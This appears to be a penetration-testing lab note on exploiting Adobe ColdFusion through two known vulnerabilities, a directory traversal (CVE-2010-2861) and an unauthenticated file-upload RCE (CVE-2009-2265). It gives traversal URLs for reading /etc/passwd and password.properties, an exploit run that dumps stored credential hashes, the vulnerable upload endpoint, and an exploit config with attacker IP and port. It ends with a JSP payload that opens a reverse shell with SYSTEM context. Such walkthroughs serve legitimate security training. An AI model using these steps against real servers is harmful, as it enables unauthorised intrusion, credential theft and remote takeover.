# Section 2 — Attacking ColdFusion

## 2.1 Finding Exploits with Searchsploit
```bash
searchsploit adobe coldfusion
```

| Exploit | Type | CVE |
|---|---|---|
| Adobe ColdFusion – Directory Traversal | Path traversal / arbitrary file read | CVE-2010-2861 |
| Adobe ColdFusion 8 – Remote Command Execution | Unauth file upload → RCE | CVE-2009-2265 |

## 2.2 Vulnerability 1 — Directory Traversal (CVE-2010-2861)
Occurs when user input reaches file/dir tags (`<cffile>`, `<cfdirectory>`) without validation — `../` sequences escape the intended directory.

**Vulnerable endpoints (CF ≤ 9.0.1):**
- `CFIDE/administrator/settings/mappings.cfm`
- `logging/settings.cfm`
- `datasources/index.cfm`
- `j2eepackaging/editarchive.cfm`
- `CFIDE/administrator/enter.cfm`

All exploitable via the `locale` parameter:
```
http://target/CFIDE/administrator/settings/mappings.cfm
    ?locale=../../../../../etc/passwd
```

**Why it matters — `password.properties`**
Highest-value target: `[cf_root]/lib/password.properties` — stores encrypted creds for datasources, mail servers, and LDAP.

**Exploitation steps**
1. `searchsploit -p 14641` → copy to working dir
2. Run (legacy, **python2**):

```bash
python2 14641.py 10.129.204.230 8500 \
  "../../../../../../../../ColdFusion8/lib/password.properties"

------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \Q>[K\=XP
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```

> [!success] Outcome
> Encrypted RDS/datasource passwords retrieved → confirms CVE-2010-2861, gives material for offline cracking or further pivoting.

## 2.3 Vulnerability 2 — Unauthenticated RCE (CVE-2009-2265)
No credentials required at all — highest-severity class of vulnerability.

**Root cause (conceptual):**
```cfml
<cfset cmd = "#cgi.query_string#">
<cfexecute name="cmd.exe" arguments="/c #cmd#" timeout="5">
```
`cmd` is built directly from attacker-controlled query string data and never validated — appending a semicolon-separated command lets an attacker chain in arbitrary OS commands with zero authentication.

**The real bug — FCKeditor file upload**
CF ≤ 8.0.1, via bundled FCKeditor component:
```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
  ?Command=FileUpload&Type=File&CurrentFolder=
```
No extension restriction on uploads → upload a `.jsp` webshell → RCE.

**Exploitation steps**
1. `searchsploit -p 50057` → copy to working dir
2. Edit the exploit's config block:

```python
lhost = '10.10.14.55'         # attacker VPN IP
lport = 4444                    # local listener port
rhost = '10.129.247.30'         # target IP
rport = 8500                     # target port
filename = uuid.uuid4().hex       # randomised payload name
```

3. Start a listener, then run the script — it uploads the JSP payload and triggers it:

```bash
python3 50057.py

Generating a payload...
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp
...
Listening for connection...
Executing the payload...
Ncat: Connection from 10.129.247.30:49866.
```

4. Reverse shell lands in `C:\ColdFusion8\runtime\bin`, running with SYSTEM-level service account context.

> [!danger] Key distinction
> RCE = arbitrary code execution, possibly requiring some access. **Unauthenticated RCE** = the same, but reachable with zero credentials. CVE-2009-2265 falls in the latter, highest-risk category.
